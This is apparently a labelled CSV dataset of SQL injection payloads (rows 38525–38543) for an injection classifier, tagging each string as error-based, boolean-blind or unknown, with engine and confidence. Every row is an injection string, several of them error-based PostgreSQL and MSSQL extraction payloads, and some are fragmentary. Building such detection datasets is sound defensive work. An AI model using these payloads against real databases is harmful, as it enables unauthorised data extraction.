id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
38525,"select * from users WHERE username = ""1\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""-5013\' ) ) ) || 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38526,-6665\' ) ) ) and ( ( ( \'winx\' = \'winx,unknown,generic,0.50,Insufficient data to classify payload type,1
38527,"select * from users WHERE username = ""1 ) ) and ( ( 5139 = 5139"" or username = ""-9295 ) ) ) or username = ""-4582 ) ) as gvfo where 8885 = 8885",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38528,"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""-2756\' where 6156 = 6156 and username = ""-8860 )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38529,"select * from users WHERE username = ""-2992\' ) ) and username = ""1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38530,"select * from users WHERE username = ""1\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'yhku\' like \'yhku"" and username = ""-3859 )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38531,"select * from users WHERE username = ""1\' or username = ""-9644 ) ) and username = ""-7209\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38532,"-9295 ) ) ) and username = ""-7430\' ) as xfah where 1596 = 1596 or username = ""1\' ) ) ) and ( ( ( \'njge\' like \'njge",unknown,generic,0.50,Insufficient data to classify payload type,1
38533,"select * from users WHERE username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616 and username = ""-8057\' ) ) as gpue where 4205 = 4205 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""-6179 ) )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38534,"1\' ) ) as plbt where 4368 = 4368 OR username = ""1%\' and \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
38535,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'iuki\' = \'iuki"" and username = ""-1190\' and \'yxry\' like \'yxry"" or username = ""1\'|| ( select \'yucg\' where 2576 = 2576",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38536,"select * from users WHERE username = ""-7951\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'blak\' = \'blak"" or username = ""1\'+ ( select oljg where 2006 = 2006",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
38537,"-9501\' ) and username = ""1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38538,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'iuki\' = \'iuki"" and username = ""1 ) as zmxb where 8424 = 8424",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38539,"select * from users WHERE username = ""-1254"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""-3978 or username = ""-3899\' ) where 8152 = 8152",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38540,"select * from users WHERE username = ""-1190\' and \'yxry\' like \'yxry"" and username = ""-8112\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'xopg\' = \'xopg"" or username = ""1 and username = ""-7430\' ) as xfah where 1596 = 1596",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38541,"1\'|| ( select \'tisi\' from dual where 1616 = 1616 and username = ""-2756\' where 6156 = 6156 or username = ""-2783%\' ) ) and ( ( \'%\' = \'",boolean_blind,oracle,0.85,Boolean Blind detected: SQL structure with complex syn (oracle),1
38542,"select * from users WHERE username = ""1 ) ) ) and ( ( ( 9548 = 9548"" and username = ""1\' ) where 2511 = 2511",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38543,"1\'+ ( select vohg where 6383 = 6383 or username = ""1 ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 3505 = 3505",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
